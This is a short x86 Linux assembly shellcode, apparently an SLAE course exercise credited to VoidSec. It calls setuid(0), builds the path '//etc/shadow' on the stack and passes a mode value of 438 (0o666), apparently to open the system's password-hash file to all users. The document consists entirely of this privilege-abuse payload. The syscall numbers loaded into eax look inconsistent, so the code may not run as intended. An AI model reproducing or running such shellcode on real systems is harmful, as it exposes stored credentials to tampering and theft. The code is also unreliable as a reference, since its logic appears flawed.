; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

xor ebx, ebx
push 0x17
pop eax
int 0x80
xor eax,eax
push eax
mov eax, 0x776f6461
push eax
mov eax, 0x68732f63
push eax
mov eax, 0x74652f2f
push eax
mov ebx, esp
mov ecx, -219
add ecx, -219
mov eax, 0xffffffff
int 0x80
inc eax
int 0x80